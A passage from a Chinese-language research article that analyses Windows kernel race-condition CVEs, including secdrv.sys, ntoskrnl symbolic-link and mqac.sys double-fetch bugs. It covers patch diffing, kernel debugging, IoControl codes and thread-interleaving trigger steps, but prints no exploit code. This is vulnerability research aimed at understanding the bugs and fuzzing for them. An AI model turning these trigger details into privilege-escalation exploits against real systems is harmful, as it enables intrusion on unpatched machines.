![](./a27f91a3-347a-464e-a3ba-da2e949a07d9.jpeg)\\n\\n*\u56fe2\uff1a\u6f0f\u6d1eCVE-2023-21537\u8865\u4e01\u5bf9\u6bd4*\\n\\n\u6700\u540e\uff0c\u901a\u8fc7BinDiff\u6216Diaphora\u7b49\u4e8c\u8fdb\u5236\u5bf9\u6bd4\u5de5\u5177\uff0c\u5373\u53ef\u5b8c\u6210\u5bf9\u8865\u4e01\u5185\u5bb9\u7684\u5206\u6790\uff0c\u5e76\u7531\u6b64\u5b9a\u4f4d\u5230\u6f0f\u6d1e\u70b9\u3002\u5982\u56fe2\u6240\u793a\uff0c\u4ee5\u6f0f\u6d1eCVE-2023-21537\u4e3a\u4f8b\uff0c\u901a\u8fc7\u5bf9\u6bd4\u5206\u6790\u8865\u4e01\u524d\u540e\u7684\u51fd\u6570\u63a7\u5236\u6d41\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u8865\u4e01\u65b0\u589e\u4e86\u53c2\u6570\u68c0\u67e5\u7684\u5206\u652f\uff08\u89c1\u7ea2\u8272\u6846\uff09\u3002\u5728\u786e\u5b9a\u53ef\u80fd\u7684\u6f0f\u6d1e\u70b9\u540e\uff0c\u5373\u53ef\u5f00\u5c55\u4eba\u5de5\u7684\u9006\u5411\u5206\u6790\u3002\\n\\n### \uff08\u4e8c\uff09Windows\u5185\u6838\u8c03\u8bd5\\n\\n\u5728\u6210\u529f\u786e\u5b9a\u6f0f\u6d1e\u70b9\u540e\uff0c\u4e0b\u4e00\u6b65\u662f\u6784\u9020PoC\u7a0b\u5e8f\uff0c\u5e76\u89e6\u53d1\u6f0f\u6d1e\u884c\u4e3a\uff0c\u4f8b\u5982\u4f7f\u5185\u6838\u51fa\u73b0\u5d29\u6e83\uff0c\u9020\u6210\u84dd\u5c4f\u6b7b\u673a\uff08Blue Screen of Death\uff09\u3002\u518d\u6b64\u57fa\u7840\u4e0a\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u6784\u9020\u6f0f\u6d1e\u5229\u7528\u7684\u65b9\u5f0f\uff0c\u4f8b\u5982\uff0c\u5229\u7528\u91ca\u653e\u540e\u4f7f\u7528\uff08Use after free\uff09\u6f0f\u6d1e\u6765\u8986\u76d6\u5173\u952e\u7684\u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u5b9e\u73b0\u8fdb\u7a0b\u63d0\u6743\u7684\u6548\u679c\u3002\\n\\n\u4e3a\u4e86\u89e6\u53d1\u5185\u6838\u4e2d\u7684\u6f0f\u6d1e\u4ee3\u7801\u7684\u6267\u884c\uff0c\u9700\u8981\u6784\u9020\u7528\u6237\u6001\u7a0b\u5e8f\u6267\u884c\u7cfb\u7edf\u8c03\u7528\u6216\u9a71\u52a8\u7a0b\u5e8f\u7684IoControl\u8c03\u7528\u3002\u8fd9\u4e9b\u51fd\u6570\u8c03\u7528\u5f80\u5f80\u9700\u8981\u5927\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u4e14\uff0c\u53c2\u6570\u9700\u8981\u6ee1\u8db3\u4e00\u5b9a\u7684\u7ea6\u675f\u6761\u4ef6\u3002\u5728\u5b9e\u9645\u7684\u6d4b\u8bd5\u4e2d\uff0c\u53d1\u73b0\u901a\u8fc7\u4eba\u5de5\u6784\u9020\u7684\u53c2\u6570\u96be\u4ee5\u4e00\u6b21\u6027\u901a\u8fc7\u68c0\u67e5\uff0c\u5fc5\u987b\u4e0d\u65ad\u8fdb\u884c\u8c03\u8bd5\u5e76\u4fee\u6539PoC\u7a0b\u5e8f\u3002\\n\\n\u5fae\u8f6f\u63d0\u4f9b\u4e86WinDbg\u7a0b\u5e8f\u7528\u4e8e\u652f\u6301Windows\u5185\u6838\u8c03\u8bd5\uff0c\u4f46\u7531\u4e8e\u5728\u5185\u6838\u51fd\u6570\u4e2d\u89e6\u53d1\u65ad\u70b9\u7b49\u64cd\u4f5c\u4f1a\u4e2d\u65ad\u6574\u4e2a\u7cfb\u7edf\u7684\u6267\u884c\uff0c\u56e0\u800c\u5fc5\u987b\u5728\u53e6\u4e00\u53f0\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884cWinDbg\uff0c\u5e76\u901a\u8fc7TCP\u8fde\u63a5\u81f3\u5f85\u8c03\u8bd5\u7684\u8ba1\u7b97\u673a\u3002\u5728\u5b9e\u9645\u7684\u5b9e\u9a8c\u4e2d\uff0c\u76f8\u5173\u7684\u5185\u6838\u8c03\u8bd5\u501f\u52a9Hyper-V\u865a\u62df\u673a\u5b8c\u6210\u3002\u7ecf\u7b14\u8005\u6d4b\u8bd5\uff0c\u8fd0\u884c\u5728Hyper-V\u865a\u62df\u673a\u4e2d\u7684Windows\u7cfb\u7edf\u5f00\u542f\u5185\u6838\u8c03\u8bd5\u6a21\u5f0f\u5e76\u8bbe\u7f6e\u7aef\u53e3\u548c\u5bc6\u94a5\u53c2\u6570\u540e\uff0c\u5373\u53ef\u5728Host\u4e0a\u901a\u8fc7WinDbg\u7a0b\u5e8f\u5f00\u542fTCP\u8fde\u63a5\u8fdb\u884c\u5185\u6838\u8c03\u8bd5\u3002\\n\\n## \u4e09\u3001\u5178\u578b\u6f0f\u6d1e\u5206\u6790\\n\\n\u7b14\u8005\u603b\u5171\u5206\u6790\u548c\u7814\u7a76\u4e8610\u4e2a\u8fd1\u5e74\u6765\u88ab\u62ab\u9732\u5e76\u5206\u914d\u4e86CVE\u7f16\u53f7\u7684Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u5b89\u5168\u6f0f\u6d1e\uff0c\u5177\u4f53\u7684\u6f0f\u6d1e\u7f16\u53f7\u3001\u5185\u6838\u6a21\u5757\u548c\u6f0f\u6d1e\u7c7b\u578b\u60c5\u51b5\u5982\u88681\u6240\u793a\u3002\u4e0b\u9762\u5c06\u901a\u8fc7\u6848\u4f8b\u5206\u6790\u4ecb\u7ecd\u5176\u4e2d\u7684\u5178\u578b\u6f0f\u6d1e\uff0c\u4ee5\u53ca\u5bf9\u672a\u6765\u9488\u5bf9\u6b64\u7c7b\u6f0f\u6d1e\u8fdb\u884c\u81ea\u52a8\u5316\u6316\u6398\u7684\u542f\u53d1\u3002\\n\\n| **CVE ID** | **\u5185\u6838\u6a21\u5757** | **\u6f0f\u6d1e\u7c7b\u578b** |\\n|----|----|----|\\n| CVE-2018-7249 | secdrv.sys | UAF |\\n| CVE-2018-8410 | ntoskrnl | Double dereference |\\n| CVE-2018-8611 | ntoskrnl | UAF |\\n| CVE-2020-1015 | UMPS | UAF |\\n| CVE-2021-26868 | win32k | UAF |\\n| CVE-2021-40449 | win32k | UAF |\\n| CVE-2021-41335 | ntoskrnl | OOB |\\n| CVE-2022-29142 | ntoskrnl | UAF |\\n| CVE-2023-21536 | ETW | UAF |\\n| CVE-2023-21537 | mqac.sys | Double fetch |\\n\\n*\u88681\uff1a\u5206\u6790\u7814\u7a76\u7684Windows\u5185\u6838\u7ade\u6001\u6761\u4ef6\u5b89\u5168\u6f0f\u6d1e*\\n\\n### \uff08\u4e00\uff09CVE-2018-7249\u6f0f\u6d1e\u5206\u6790\\n\\n\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8eWindows\u7684secdrv.sys\u9a71\u52a8\u7a0b\u5e8f\u4e2d\uff0c\u662f\u4e00\u4e2aUAF\u7c7b\u578b\u7684\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u7684\u590d\u73b0\u7248\u672c\u4e3aWindows 7 7600\u3002\\n\\nsecdrv.sys\u9a71\u52a8\u7a0b\u5e8f\u63d0\u4f9b\u4e86IoControl\u8c03\u7528\u53f7\u4e3a0x0CA002813\u7684\u63a5\u53e3\uff0c\u5176\u5904\u7406\u51fd\u6570sub_11A88\u63a5\u6536\u4e09\u79cd\u4e0d\u540c\u7684\u8f93\u5165\u53c2\u6570\uff1a0x96\u30010x97\u548c0x98\uff0c\u5e76\u6839\u636e\u53c2\u6570\u8c03\u7528\u4e0d\u540c\u7684\u6d3e\u53d1\u51fd\u6570\u3002\u5176\u4e2d\uff1a0x96\u4ece\u5206\u9875\u5185\u5b58\u6c60\u4e2d\u5206\u914d\u5185\u5b58\u5757\uff0c\u8fdb\u884c\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u5e76\u5c06\u5176\u4e2d\u4e00\u90e8\u5206\u590d\u5236\u5230\u7528\u6237\u63d0\u4f9b\u7684\u7f13\u51b2\u533a\u4e2d\uff08\u6b64\u5904\u8fd8\u5b58\u5728\u4e00\u4e2a\u672a\u521d\u59cb\u5316\u8bbf\u95ee\u7684\u95ee\u9898\uff0c\u5bfc\u81f4\u5185\u6838\u6001\u768416\u6bd4\u7279\u5185\u5b58\u6cc4\u6f0f\u5230\u7528\u6237\u6001\uff09\u30020x97\u8bfb\u53d6\u5148\u524d\u75310x96\u5206\u914d\u7684\u5757\uff0c\u5e76\u5bf9\u7528\u6237\u8f93\u5165\u7f13\u51b2\u533a\u8fdb\u884c\u52a0\u5bc6\u30020x98\u5219\u7528\u4e8e\u91ca\u653e\u75310x96\u5206\u914d\u7684\u5757\u3002\\n\\n ![](./056ed014-f8db-4676-83ed-bb31e609f25c.png)\\n\\n*\u56fe3\uff1a\u5904\u7406\u51fd\u6570\u6839\u636e\u8f93\u5165\u53c2\u6570a2\u6267\u884c\u4e0d\u540c\u64cd\u4f5c*\\n\\n\u5f53\u8c03\u7528IoControl\u7c7b\u578b0x97\u65f6\uff0c\u5b83\u901a\u8fc7\u6807\u7b7e\u627e\u5230\u4e4b\u524d\u7531\u7c7b\u578b0x96\u5206\u914d\u7684\u5185\u5b58\u5757\u3002\u8fd9\u91cc\u7684\u6f0f\u6d1e\u5728\u4e8e\uff0c0x97\u4f7f\u7528\u5185\u5b58\u7684\u8fc7\u7a0b\u7f3a\u5c11\u52a0\u9501\u548c\u540c\u6b65\u673a\u5236\u3002\u5728\u5176\u64cd\u4f5c\u5185\u5b58\u671f\u95f4\uff0c\u8fd9\u6bb5\u5185\u5b58\u53ef\u80fd\u88ab\u91ca\u653e\uff0c\u56e0\u6b64\u5982\u679c\u6076\u610f\u653b\u51fb\u8005\u6210\u529f\u8d62\u5f97\u7ade\u6001\u6761\u4ef6\uff0c\u5c06\u89e6\u53d1\u91ca\u653e\u540e\u4f7f\u7528\u7684\u95ee\u9898\u3002\u8fdb\u4e00\u6b65\u5730\uff0c\u5982\u679c\u653b\u51fb\u8005\u5728IoControl\u7c7b\u578b0x97\u7684\u64cd\u4f5c\u671f\u95f4\uff0c\u4f7f\u7528\u7c7b\u578b0x98\u6210\u529f\u91ca\u653e\u4e86\u5757\uff0c\u5e76\u91cd\u65b0\u5206\u914d\u4e86\u4e00\u4e2a\u7531\u653b\u51fb\u8005\u63a7\u5236\u7684\u65b0\u5757\u5230\u5b8c\u5168\u76f8\u540c\u7684\u5185\u5b58\u4f4d\u7f6e\uff0c\u90a3\u4e48\u8fd9\u5c06\u6709\u53ef\u80fd\u6700\u7ec8\u52ab\u6301\u9a71\u52a8\u7a0b\u5e8f\u7684\u6267\u884c\u63a7\u5236\u6d41\uff0c\u5e76\u5728\u5185\u6838\u6001\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u7531\u4e8e0x97\u4e2d\u7684\u52a0\u5bc6\u51fd\u6570\u5728\u7528\u6237\u63d0\u4f9b\u7684\u7f13\u51b2\u533a\u4e0a\u6267\u884c\uff0c\u8fd9\u4e2a\u7f13\u51b2\u533a\u53ef\u4ee5\u975e\u5e38\u5927\uff0c\u56e0\u6b64\u52a0\u5bc6\u53ef\u80fd\u9700\u8981\u5f88\u957f\u65f6\u95f4\u624d\u80fd\u6267\u884c\uff0c\u4ece\u800c\u4e3aIoControl\u7c7b\u578b0x98\u63d0\u4f9b\u4e86\u5b8c\u7f8e\u7684\u65f6\u95f4\u7a97\u53e3\u6765\u8fbe\u6210\u7ade\u6001\u6761\u4ef6\u3002\\n\\n\u8be5\u6f0f\u6d1e\u5b58\u5728\u516c\u5f00\u7684Exp\u7a0b\u5e8f\uff0c\u7ecf\u8fc7\u7b80\u5355\u8c03\u8bd5\u540e\u5373\u53ef\u7a33\u5b9a\u5b9e\u73b0\u6f0f\u6d1e\u5229\u7528\uff0c\u83b7\u5f97SYSTEM\u6743\u9650\u3002\\n\\n ![](./73734e47-cf9a-4702-b521-4979d61a1286.png)\\n\\n*\u56fe4\uff1a\u590d\u73b0\u6f0f\u6d1eCVE-2018-7249\u5b9e\u73b0\u63d0\u6743*\\n\\n\u8be5\u6f0f\u6d1e\u7684\u89e6\u53d1\u65b9\u5f0f\u8f83\u4e3a\u7b80\u5355\uff0c\u4e14\u8f93\u5165\u53c2\u6570\u4e5f\u6ca1\u6709\u8f83\u4e3a\u82db\u523b\u7684\u7ea6\u675f\u6761\u4ef6\uff0c\u56e0\u800c\u901a\u8fc7\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\u5de5\u5177\u53d1\u73b0\u8be5\u6f0f\u6d1e\u662f\u53ef\u80fd\u7684\u3002\u73b0\u6709\u7684\u7ade\u6001\u6761\u4ef6\u6f0f\u6d1e\u6316\u6398\u65b9\u6848\u53ef\u4ee5\u81ea\u52a8\u7531\u987a\u5e8f\u6267\u884c\u7684IoControl\u8c03\u7528\u5e8f\u5217\u751f\u6210\u591a\u7ebf\u7a0b\u7684\u5e8f\u5217\uff0c\u5e76\u63a2\u7d22\u4e0d\u540c\u7ebf\u7a0b\u4ea4\u9519\u7684\u60c5\u51b5\u4e0b\u5176\u6267\u884c\u8fc7\u7a0b\u662f\u5426\u51fa\u73b0\u5f02\u5e38\u3002\u4e0d\u8fc7\uff0c\u8fd9\u4ecd\u9700\u8981\u5148\u901a\u8fc7\u5bf9\u9a71\u52a8\u7a0b\u5e8f\u7684\u5206\u6790\uff0c\u63a8\u65ad\u51fa\u76f8\u5173\u7684IoControl\u8c03\u7528\u53f7\uff0c\u5e76\u6307\u5bfc\u6a21\u7cca\u6d4b\u8bd5\u5668\u901a\u8fc7\u542f\u52a8\u591a\u4e2a\u7ebf\u7a0b\u6765\u5206\u522b\u6267\u884c0x97\u548c0x98\u5bf9\u5e94\u7684IoControl\u64cd\u4f5c\u3002\u6709\u5173\u95ee\u9898\u4ecd\u9700\u8fdb\u4e00\u6b65\u7814\u7a76\u3002\\n\\n### \uff08\u4e8c\uff09CVE-2021-41335\u6f0f\u6d1e\u5206\u6790\\n\\n\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8eWindows\u7684\u5185\u6838ntoskrnl.exe\u4e2d\u3002\u6f0f\u6d1e\u7684\u539f\u56e0\u662f\u4e24\u4e2a\u5185\u6838\u51fd\u6570\uff1aObpCreateSymbolicLinkName\u4e0eObpDeleteSymbolicLinkName\u53ef\u80fd\u64cd\u4f5c\u540c\u4e00\u4e2a_OBJECT_SYMBOLIC_LINK\u5185\u6838\u5bf9\u8c61\uff0c\u4f46\u5b83\u4eec\u5e76\u672a\u6b63\u786e\u8fdb\u884c\u52a0\u9501\u64cd\u4f5c\uff0c\u56e0\u800c\u5b58\u5728\u7ade\u6001\u6761\u4ef6\u5b89\u5168\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5c06\u5bfc\u81f4\u8d8a\u754c\u8bbf\u95ee\uff0c\u5e76\u53ef\u4ee5\u88ab\u8fdb\u4e00\u6b65\u5229\u7528\uff0c\u5bfc\u81f4\u5185\u6838\u4efb\u610f\u5730\u5740\u5199\uff0c\u9020\u6210\u4e25\u91cd\u7684\u7834\u574f\u3002\u8be5\u6f0f\u6d1e\u7684\u590d\u73b0\u7248\u672c\u4e3aWindows 10 21H1 19043.928\u3002\\n\\n\u89e6\u53d1\u6f0f\u6d1e\u7684\u8c03\u7528\u94fe\u662f\uff1aNtCreateSymbolicLinkObject\u7cfb\u7edf\u8c03\u7528\u4f1a\u6267\u884cObInsertObjectEx\u6765\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\uff0c\u8be5\u51fd\u6570\u5148\u8c03\u7528ObpCreateHandle\u6765\u4e3a\u65b0\u7684\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u53e5\u67c4\uff0c\u518d\u8c03\u7528ObpCreateSymbolicLinkName\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\u3002\u7136\u800c\uff0c\u5728ObpCreateHandle\u6267\u884c\u7ed3\u675f\u540e\uff0c\u7528\u6237\u6001\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u62e5\u6709\u4e86\u6307\u5411\u5185\u6838\u5bf9\u8c61\u7684\u6709\u6548\u53e5\u67c4\u3002\u8fd9\u610f\u5473\u7740\uff0c\u5728\u968f\u540eObInsertObjectEx\u8c03\u7528ObpCreateSymbolicLinkName\u65f6\uff0c\u7528\u6237\u6001\u8fdb\u7a0b\u53ef\u4ee5\u5f00\u542f\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5e76\u5c1d\u8bd5\u901a\u8fc7\u8be5\u53e5\u67c4\u64cd\u4f5c\u4ecd\u5728\u88ab\u5185\u6838\u51fd\u6570\u4f7f\u7528\u7684\u65b0\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u3002\u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u4e2d\u901a\u8fc7NtClose\u51fd\u6570\u8c03\u7528\u5173\u95ed\u8be5\u53e5\u67c4\uff0c\u8fd9\u663e\u7136\u4f1a\u5bfc\u81f4\u95ee\u9898\u3002\\n\\n\u4e3a\u4e86\u8fdb\u4e00\u6b65\u660e\u786e\u6f0f\u6d1e\u7684\u6210\u56e0\uff0c\u901a\u8fc7\u4eba\u5de5\u9006\u5411\u5206\u6790\u6bd4\u8f83ObpCreateSymbolicLinkName\u548cObpDeleteSymbolicLinkName\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u6ce8\u610f\u5230\uff1aObpDeleteSymbolicLinkName\u5c06\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u7684DosDeviceDriveIndex\u6210\u5458\u8bbe\u7f6e\u4e3a0\uff1b\u800cObpCreateSymbolicLinkName\u8bfb\u53d6\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u7684\u8be5\u6210\u5458\u5e76\u5c06\u5176\u51cf\u5c0f1\u3002\u6b64\u5916\uff0cObpCreateSymbolicLinkName\u4f7f\u7528\u51cf\u5c0f\u540e\u7684DosDeviceDriveIndex\u503c\u4f5c\u4e3a_DEVICE_MAP\u7ed3\u6784\u4e2d\u7684DriveType\u6570\u7ec4\u7684\u7d22\u5f15\u3002\\n\\n ![](./6bdd1ff7-570c-45a9-8d71-4e9d73d46c2d.png)\\n\\n*\u56fe5\uff1a\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u7684DosDeviceDriveIndex\u6210\u5458\u88ab\u7f6e\u96f6*\\n\\n\u7531\u4e8e\u52a0\u9501\u64cd\u4f5c\u5b58\u5728\u95ee\u9898\uff0c\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u8bd5\u56fe\u4f7fDosDeviceDriveIndex\u6210\u5458\u5df2\u7ecf\u88ab\u7f6e\u96f6\u540e\uff0c\u53c8\u8fdb\u884c\u81ea\u51cf\u64cd\u4f5c\uff0c\u7531\u6b64\u4ea7\u751f\u6574\u6570\u4e0b\u6ea2\u3002\u53c8\u7531\u4e8e\u8be5\u6570\u503c\u88ab\u7528\u4e8e\u6570\u7ec4\u7d22\u5f15\uff0c\u8fd9\u5c06\u5bfc\u81f4\u8d8a\u754c\u8bbf\u95ee\u3002\\n\\n\u4e3a\u4e86\u590d\u73b0\u6b64\u6f0f\u6d1e\uff0c\u9700\u8981\u521b\u5efa\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u7b2c\u4e00\u4e2a\u7ebf\u7a0b\u901a\u8fc7NtCreateSymbolicLinkObject\u4e0d\u65ad\u521b\u5efa\u65b0\u7684\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\uff0c\u800c\u7b2c\u4e8c\u4e2a\u7ebf\u7a0b\u5219\u901a\u8fc7NtClose\u4e0d\u65ad\u5173\u95ed\u65b0\u521b\u5efa\u7684\u7b26\u53f7\u94fe\u63a5\u5bf9\u8c61\u53e5\u67c4\u3002\u901a\u8fc7\u8fd9\u6837\u505a\uff0c\u5f88\u53ef\u80fd\u51fa\u73b0ObpDeleteSymbolicLinkName\u5728ObpCreateSymbolicLinkName\u4e4b\u524d\u88ab\u8c03\u7528\u7684\u7ebf\u7a0b\u4ea4\u9519\u60c5\u51b5\u3002\u56e0\u6b64\uff0cObpCreateSymbolicLinkName\u5c06\u4ee5\u503c0xFFFFFFFF\u4f5c\u4e3a\u7d22\u5f15\u8bbf\u95eeDriveType\u6570\u7ec4\uff0c\u5bfc\u81f4\u5728\u6570\u7ec4\u8fb9\u754c\u4e4b\u5916\u5199\u5165\u4efb\u610f\u503c\uff0c\u6700\u7ec8\u5f15\u53d1\u5185\u6838\u5d29\u6e83\u3002\u5177\u4f53\u7684\u6f0f\u6d1e\u590d\u73b0\u60c5\u51b5\u548c\u8c03\u8bd5\u5668\u8bfb\u51fa\u7684\u5bc4\u5b58\u5668\u53c2\u6570\u5982\u56fe6\u3001\u56fe7\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u6267\u884cNtClose\u7684\u7ebf\u7a0b\u8fdb\u884c\u4e86\u591a\u4e8e35\u4e07\u6b21\u5c1d\u8bd5\uff0c\u624d\u89e6\u53d1\u4e86\u5bfc\u81f4\u6f0f\u6d1e\u7684\u7ebf\u7a0b\u4ea4\u9519\u65b9\u5f0f\u3002\\n\\n ![](./d8149816-c428-416a-b8f3-fe5a5ee93574.png)\\n\\n*\u56fe6\uff1a\u8fd0\u884cPoC\u7a0b\u5e8f\uff0c\u4e24\u4e2a\u7ebf\u7a0b\u5206\u522b\u521b\u5efa\u548c\u9500\u6bc1\u5185\u6838\u5bf9\u8c61*\\n\\n ![](./d72340f0-03f2-441d-8c4f-c134330f15fe.png)\\n\\n*\u56fe7\uff1aWinDbg\u6355\u83b7\u84dd\u5c4f\u6b7b\u673a\u7684\u60c5\u51b5\uff0c\u53ef\u89c1rcx\u5bc4\u5b58\u5668\u503c\u5b58\u5728\u6574\u6570\u4e0b\u6ea2*\\n\\n\u901a\u8fc7\u8865\u4e01\u5bf9\u6bd4\u5206\u6790\u53ef\u4ee5\u53d1\u73b0\uff0c\u8be5\u6f0f\u6d1e\u7684\u4fee\u590d\u65b9\u5f0f\u662f\u7531ObpCreateHandle\u6765\u8c03\u7528ObpCreateSymbolicLinkName\u521b\u5efa\u7b26\u53f7\u94fe\u63a5\uff0c\u907f\u514d\u7528\u6237\u6001\u8fdb\u7a0b\u63d0\u524d\u5bf9\u53e5\u67c4\u8fdb\u884c\u64cd\u4f5c\u3002\\n\\n### \uff08\u4e09\uff09CVE-2023-21537\u6f0f\u6d1e\u5206\u6790\\n\\n\u8be5\u6f0f\u6d1e\u4e8e2023\u5e741\u6708\u62ab\u9732\uff0c\u5e76\u5df2\u88ab\u5fae\u8f6f\u4fee\u590d\u3002\u6f0f\u6d1e\u5e76\u6ca1\u6709\u516c\u5f00\u7684PoC\u7a0b\u5e8f\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u53ea\u901a\u8fc7\u535a\u5ba2\u6587\u7ae0\u900f\u9732\u4e86\u90e8\u5206\u4fe1\u606f\u3002\u8be5\u6f0f\u6d1e\u7684\u590d\u73b0\u7248\u672c\u4e3aWindows 10 21H1 19043.928\u3002\\n\\n\u8be5\u6f0f\u6d1e\u5b58\u5728\u4e8e\u6d88\u606f\u961f\u5217\uff08MSMQ\uff09\u9a71\u52a8\u7a0b\u5e8fmqac.sys\u4e2d\u3002\u6d88\u606f\u961f\u5217\u662fWindows\u7684\u53ef\u9009\u529f\u80fd\uff0c\u9700\u8981\u5728\u63a7\u5236\u9762\u677f\u4e2d\u624b\u52a8\u542f\u7528\uff0c\u5e76\u5728\u8ba1\u7b97\u673a\u7ba1\u7406\u4e2d\u521b\u5efa\u6d88\u606f\u961f\u5217\u3002\u5fae\u8f6f\u4e3a\u6d88\u606f\u961f\u5217\u7684\u5f00\u53d1\u63d0\u4f9b\u4e86\u5934\u6587\u4ef6mq.h\u4ee5\u53ca\u8fd0\u884c\u65f6\u5e93mqrt.dll\uff0c\u5176\u4e2d\u5305\u542bMQOpenQueue\u548cMQSendMessage\u7b49\u51fd\u6570\u3002\u8fd9\u4e9b\u51fd\u6570\u5176\u5b9e\u662f\u5c01\u88c5\u4e86\u5bf9\u9a71\u52a8\u7a0b\u5e8fmqac.sys\u53d1\u8d77\u7684IoControl\u8c03\u7528\uff0c\u901a\u8fc7\u6784\u9020\u5408\u6cd5\u7684\u53c2\u6570\uff0c\u7528\u6237\u6001\u7a0b\u5e8f\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528NtDeviceIoControlFile\u53d1\u9001IoControl\u8c03\u7528\uff0c\u89e6\u53d1\u6b64\u9a71\u52a8\u7a0b\u5e8f\u7684\u529f\u80fd\u3002\\n\\n\u8be5\u6f0f\u6d1e\u7684\u6210\u56e0\u662fmqac.sys\u4e2d\u7684ACSendMessage\u51fd\u6570\u4f1a\u4e24\u6b21\u8bfb\u53d6\u4e00\u4e2a\u6765\u81ea\u7528\u6237\u7684\u8f93\u5165\u53c2\u6570\uff0c\u7b2c\u4e00\u6b21\u8be5\u53c2\u6570\u7528\u4e8e\u63a7\u5236\u6570\u7ec4\u957f\u5ea6\uff0c\u7b2c\u4e8c\u6b21\u5219\u662f\u5728\u91ca\u653e\u5806\u5185\u5b58\u65f6\uff0c\u6839\u636e\u8be5\u957f\u5ea6\u8fdb\u884c\u91ca\u653e\u3002\u7136\u800c\uff0c\u8fd9\u6bb5\u903b\u8f91\u5e76\u672a\u8003\u8651\u53c2\u6570\u4f1a\u88ab\u7528\u6237\u4fee\u6539\u7684\u53ef\u80fd\uff0c\u56e0\u800c\u6784\u6210\u4e00\u4e2aDouble fetch\u6f0f\u6d1e\uff0c\u53ef\u80fd\u5bfc\u81f4\u9519\u8bef\u7684\u5185\u5b58\u88ab\u91ca\u653e\u3002\\n\\nmqac.sys\u4e2d\u8d1f\u8d23\u5904\u7406IoControl\u8c03\u7528\u7684\u51fd\u6570\u540d\u79f0\u4e3aACDeviceControl\uff0c\u8be5\u51fd\u6570\u5c06\u4f1a\u89e3\u6790\u7528\u6237\u4f20\u5165\u7684\u53c2\u6570\uff0c\u5e76\u8c03\u7528\u4e0d\u540c\u7684\u6d3e\u53d1\u51fd\u6570\u3002\u901a\u8fc7\u9006\u5411\u5206\u6790ACDeviceControl\u51fd\u6570\uff0c\u53d1\u73b0\u5f53IoControl\u8c03\u7528\u53f7\u4e3a0x19658107\u4e14\u8f93\u51fa\u7f13\u51b2\u533a\u7684\u603b\u957f\u5ea6\u4e3a0x2C0\u65f6\uff0c\u5b83\u4f1a\u8fdb\u4e00\u6b65\u8c03\u7528ACSendMessage\u8fd9\u4e00\u6d3e\u53d1\u51fd\u6570\u3002ACSendMessage\u51fd\u6570\u9996\u5148\u5c06\u7528\u6237\u6001\u7f13\u51b2\u533a\u590d\u5236\u5230\u5185\u6838\u6001\u6808\u4e0a\u7684\u7f13\u51b2\u533a\uff0c\u4e4b\u540e\uff0c\u5c06\u6267\u884c\u6838\u5fc3\u7684\u4e1a\u52a1\u903b\u8f91\uff0c\u8c03\u7528 CQueue::PutNewPacket\u6765\u53d1\u9001\u7528\u6237\u8bf7\u6c42\u7684\u6570\u636e\uff0c\u5b8c\u6210\u540e\u518d\u8c03\u7528 ACFreeDeepCopyQueueFormat\u8fdb\u884c\u5806\u5185\u5b58\u7684\u91ca\u653e\u3002\u6b64\u5904\u4fbf\u5b58\u5728\u6f0f\u6d1e\uff1a\u8fdb\u884c\u5185\u5b58\u91ca\u653e\u64cd\u4f5c\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u76f4\u63a5\u8bfb\u53d6\u81ea\u7528\u6237\u6001\u7f13\u51b2\u533a\u4e2d\u3002\u5982\u56fe8\u6240\u793a\uff0c\u53c2\u6570a4\u5c31\u662f\u6307\u5411\u7f13\u51b2\u533a\u7684\u6307\u9488\u3002\\n\\n ![](./b485e0c2-cb7a-4903-91ba-6af3bc701754.png)\\n\\n*\u56fe8\uff1a\u6f0f\u6d1e\u51fd\u6570\u91cd\u590d\u8bfb\u53d6\u4e86\u7528\u6237\u8f93\u5165*\\n\\n\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6076\u610f\u653b\u51fb\u8005\u8bbe\u6cd5\u8d62\u5f97\u7ade\u6001\u6761\u4ef6\uff0c\u5728ACSendMessage\u51fd\u6570\u8fdb\u884c\u5185\u5b58\u91ca\u653e\u524d\u6210\u529f\u5730\u4fee\u6539\u4e86\u6b64\u5904\u7684\u53c2\u6570\u503c\uff0c\u5c06\u5176\u8bbe\u7f6e\u4e3a\u8f83\u5927\u7684\u503c\uff0c\u90a3\u4e48\u5c06\u5bfc\u81f4\u8d85\u51fa\u8303\u56f4\u5730\u91ca\u653e\u4efb\u610f\u6307\u9488\u3002\\n\\n\u7ecf\u8fc7\u8fdb\u4e00\u6b65\u5206\u6790\uff0c\u89e6\u53d1\u6f0f\u6d1e\u65f6\u6d88\u606f\u961f\u5217\u865a\u62df\u8bbe\u5907\u9700\u8981\u5904\u4e8e\u7279\u5b9a\u7684\u72b6\u6001\uff0c\u8fd9\u9700\u8981PoC\u7a0b\u5e8f\u9884\u5148\u6267\u884c\u5176\u5b83\u7684IoControl\u8c03\u7528\u3002\u540c\u65f6\uf